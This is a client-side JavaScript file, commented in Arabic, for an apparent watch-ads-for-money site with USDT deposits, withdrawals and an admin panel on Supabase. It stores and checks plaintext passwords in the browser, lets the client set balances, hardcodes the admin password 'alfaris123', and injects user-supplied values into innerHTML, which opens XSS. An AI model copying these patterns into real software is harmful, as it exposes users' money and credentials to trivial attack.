// -------------------------------
// 1) ربط Supabase
// -------------------------------

const SUPABASE_URL = "https://scxntlerjrxfmibnuqvc.supabase.co";
const SUPABASE_KEY = "sb_publishable_vX81waCjj0Y0iQoDdadqTw_TqWPdGaY";
const db = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// -------------------------------
// 2) وظائف التنقل
// -------------------------------

function goDashboard() { window.location = "dashboard.html"; }
function goDeposit() { window.location = "deposit.html"; }
function goWithdraw() { window.location = "withdraw.html"; }
function goAds() { window.location = "ads.html"; }

// -------------------------------
// 3) عرض رسائل التنبيه
// -------------------------------

function showAlert(type, msg) {
    const alert = document.getElementById("alert");
    if (!alert) return;

    alert.className = "alert " + (type === "error" ? "alert-error" : "alert-success");
    alert.innerText = msg;
    alert.style.display = "block";

    setTimeout(() => { alert.style.display = "none"; }, 3000);
}

// -------------------------------
// 4) إنشاء حساب
// -------------------------------

async function register() {
    let email = document.getElementById("email").value.trim();
    let password = document.getElementById("password").value.trim();

    if (!email || !password) return showAlert("error", "املأ كل الحقول!");

    const { data: exists } = await db
        .from("users")
        .select("*")
        .eq("email", email);

    if (exists.length > 0) return showAlert("error", "هذا البريد مستخدم بالفعل!");

    const { data, error } = await db
        .from("users")
        .insert([{ email, password, balance: 0, total_deposit: 0 }]);

    if (error) return showAlert("error", "حدث خطأ!");

    localStorage.setItem("user", email);
    window.location = "dashboard.html";
}

// -------------------------------
// 5) تسجيل الدخول
// -------------------------------

async function login() {
    let email = document.getElementById("email").value.trim();
    let password = document.getElementById("password").value.trim();

    const { data, error } = await db
        .from("users")
        .select("*")
        .eq("email", email)
        .eq("password", password)
        .single();

    if (!data) return showAlert("error", "المعلومات غير صحيحة!");

    localStorage.setItem("user", email);
    window.location = "dashboard.html";
}

// -------------------------------
// 6) جلب بيانات المستخدم للوحة التحكم
// -------------------------------

async function loadDashboard() {
    if (!document.getElementById("balance")) return;

    let email = localStorage.getItem("user");
    if (!email) return window.location = "index.html";

    const { data } = await db
        .from("users")
        .select("*")
        .eq("email", email)
        .single();

    document.getElementById("balance").innerText = data.balance + "$";
    document.getElementById("total_deposit").innerText = data.total_deposit + "$";

    // عدد الإعلانات اليومية ثابت الآن = 2
    document.getElementById("ads_today").innerText = 2;

    // عدد الإعلانات التي شاهدها اليوم = 0
    document.getElementById("watched").innerText = 0;
}

loadDashboard();

// -------------------------------
// 7) إرسال طلب شحن
// -------------------------------

async function sendDeposit() {
    let email = localStorage.getItem("user");
    let amount = document.getElementById("amount").value;
    let txid = document.getElementById("txid").value.trim();

    if (!txid) return showAlert("error", "أدخل رقم المعاملة!");

    const { data: user } = await db
        .from("users")
        .select("*")
        .eq("email", email)
        .single();

    await db.from("deposits").insert([
        { user_id: user.id, amount, txid, status: "pending" }
    ]);

    showAlert("success", "تم إرسال طلب الشحن بنجاح!");
}

// -------------------------------
// 8) إرسال طلب سحب
// -------------------------------

async function sendWithdraw() {
    let email = localStorage.getItem("user");
    let amount = document.getElementById("withdraw_amount").value;
    let wallet = document.getElementById("withdraw_wallet").value.trim();

    if (!amount || !wallet) return showAlert("error", "املأ كل الحقول!");

    const { data: user } = await db
        .from("users")
        .select("*")
        .eq("email", email)
        .single();

    await db.from("withdrawals").insert([
        { user_id: user.id, amount, wallet, status: "pending" }
    ]);

    showAlert("success", "تم إرسال طلب السحب!");
}

// -------------------------------
// 9) نظام الإعلان (15 ثانية)
// -------------------------------

if (document.getElementById("timer")) {
    let time = 15;
    let btn = document.getElementById("earnBtn");
    let timer = document.getElementById("timer");

    let interval = setInterval(() => {
        time--;
        timer.innerText = time;

        if (time <= 0) {
            clearInterval(interval);
            btn.disabled = false;
        }
    }, 1000);

    // عند الضغط على الربح
    btn.onclick = async function () {
        let email = localStorage.getItem("user");

        const { data: user } = await db
            .from("users")
            .select("*")
            .eq("email", email)
            .single();

        // الربح = 3 دولار لكل إعلان
        let newBalance = parseFloat(user.balance) + 3;

        await db
            .from("users")
            .update({ balance: newBalance })
            .eq("id", user.id);

        showAlert("success", "تم إضافة 3$ إلى رصيدك!");
    };
}

// -------------------------------
// 10) لوحة الإدارة — تسجيل الدخول
// -------------------------------

function adminLogin() {
    let pass = document.getElementById("admin_pass").value.trim();

    if (pass !== "alfaris123") {
        return showAlert("error", "كلمة المرور غير صحيحة!");
    }

    document.getElementById("adminLogin").style.display = "none";
    document.getElementById("adminPanel").style.display = "block";

    loadAdminPanel();
}

// -------------------------------
// 11) تحميل طلبات الشحن والسحب
// -------------------------------

async function loadAdminPanel() {
    // الشحن
    const { data: deposits } = await db.from("deposits").select("*");
    let depList = document.getElementById("depositList");
    depList.innerHTML = "";

    deposits.forEach(d => {
        depList.innerHTML += `
            <div class="list-item">
                <div>
                    مبلغ: ${d.amount} USDT<br>
                    TXID: ${d.txid}<br>
                    الحالة: ${d.status}
                </div>
                <div>
                    <button class="btn btn-primary" onclick="approveDeposit('${d.id}', '${d.user_id}', ${d.amount})">قبول</button>
                    <button class="btn btn-outline" onclick="rejectDeposit('${d.id}')">رفض</button>
                </div>
            </div>
        `;
    });

    // السحب
    const { data: withdrawals } = await db.from("withdrawals").select("*");
    let wList = document.getElementById("withdrawList");
    wList.innerHTML = "";

    withdrawals.forEach(w => {
        wList.innerHTML += `
            <div class="list-item">
                <div>
                    مبلغ: ${w.amount}$<br>
                    محفظة: ${w.wallet}<br>
                    الحالة: ${w.status}
                </div>
                <div>
                    <button class="btn btn-primary" onclick="approveWithdraw('${w.id}', '${w.user_id}', ${w.amount})">قبول</button>
                    <button class="btn btn-outline" onclick="rejectWithdraw('${w.id}')">رفض</button>
                </div>
            </div>
        `;
    });
}

// -------------------------------
// 12) قبول الشحن
// -------------------------------

async function approveDeposit(id, user_id, amount) {

    // تحديث حالة الطلب
    await db.from("deposits").update({ status: "approved" }).eq("id", id);

    // جلب المستخدم
    const { data: user } = await db
        .from("users")
        .select("*")
        .eq("id", user_id)
        .single();

    let newBalance = parseFloat(user.balance) + parseFloat(amount);
    let newTotal = parseFloat(user.total_deposit) + parseFloat(amount);

    await db
        .from("users")
        .update({ balance: newBalance, total_deposit: newTotal })
        .eq("id", user_id);

    loadAdminPanel();
}

// -------------------------------
// 13) رفض الشحن
// -------------------------------

async function rejectDeposit(id) {
    await db.from("deposits").update({ status: "rejected" }).eq("id", id);
    loadAdminPanel();
}

// -------------------------------
// 14) قبول طلب السحب
// -------------------------------

async function approveWithdraw(id, user_id, amount) {

    const { data: user } = await db
        .from("users")
        .select("*")
        .eq("id", user_id)
        .single();

    let newBalance = parseFloat(user.balance) - parseFloat(amount);

    if (newBalance < 0) newBalance = 0;

    await db.from("users").update({ balance: newBalance }).eq("id", user_id);
    await db.from("withdrawals").update({ status: "approved" }).eq("id", id);

    loadAdminPanel();
}

// -------------------------------
// 15) رفض السحب
// -------------------------------

async function rejectWithdraw(id) {
    await db.from("withdrawals").update({ status: "rejected" }).eq("id", id);
    loadAdminPanel();
}

// -------------------------------
// 16) خروج المدير
// -------------------------------

function logoutAdmin() {
    document.getElementById("adminPanel").style.display = "none";
    document.getElementById("adminLogin").style.display = "block";
}
